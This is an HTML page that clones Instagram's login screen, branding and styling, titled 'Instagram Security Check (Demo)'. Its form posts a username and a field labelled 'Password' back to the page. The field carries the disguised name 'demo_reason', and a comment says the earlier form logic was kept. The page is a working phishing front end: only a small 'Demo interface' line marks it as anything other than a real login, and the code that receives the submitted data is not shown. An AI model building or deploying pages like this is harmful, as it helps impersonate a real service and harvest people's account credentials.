<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Instagram Security Check (Demo)</title>

<!-- Instagram-like font -->
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">

<style>
* {
    box-sizing: border-box;
}
body {
    margin: 0;
    font-family: 'Roboto', sans-serif;
    background-color: #fafafa;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
}

.wrapper {
    width: 350px;
}

.box {
    background: #ffffff;
    border: 1px solid #dbdbdb;
    padding: 40px 30px;
    text-align: center;
    border-radius: 8px;
}

.logo {
    font-size: 36px;
    font-weight: 500;
    margin-bottom: 30px;
    color: #262626;
}

input {
    width: 100%;
    padding: 12px 10px;
    margin-bottom: 8px;
    border: 1px solid #dbdbdb;
    background: #fafafa;
    font-size: 14px;
    border-radius: 4px;
}

input:focus {
    outline: none;
    border-color: #a8a8a8;
    background: #fff;
}

button {
    width: 100%;
    padding: 10px;
    margin-top: 12px;
    background-color: #0095f6;
    border: none;
    color: white;
    font-weight: 500;
    font-size: 14px;
    border-radius: 6px;
    cursor: pointer;
}

button:hover {
    background-color: #1877f2;
}

.footer-box {
    background: #ffffff;
    border: 1px solid #dbdbdb;
    margin-top: 12px;
    padding: 20px;
    text-align: center;
    font-size: 14px;
}

.footer-box a {
    color: #0095f6;
    text-decoration: none;
    font-weight: 500;
}

.note {
    font-size: 12px;
    color: gray;
    margin-top: 15px;
}
</style>
</head>

<body>

<div class="wrapper">

    <div class="box">
        <div class="logo">Instagram</div>

        <!-- SAME FORM LOGIC KEPT -->
        <form method="POST" action="">
            <input type="text" name="demo_user" placeholder="Username " required>
            <input type="text" name="demo_reason" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>

        <div class="note">
            Demo interface – No real account access
        </div>
    </div>

    <div class="footer-box">
        Don’t have an account?
        <a href="#">Sign up</a>
    </div>

</div>

</body>
</html>
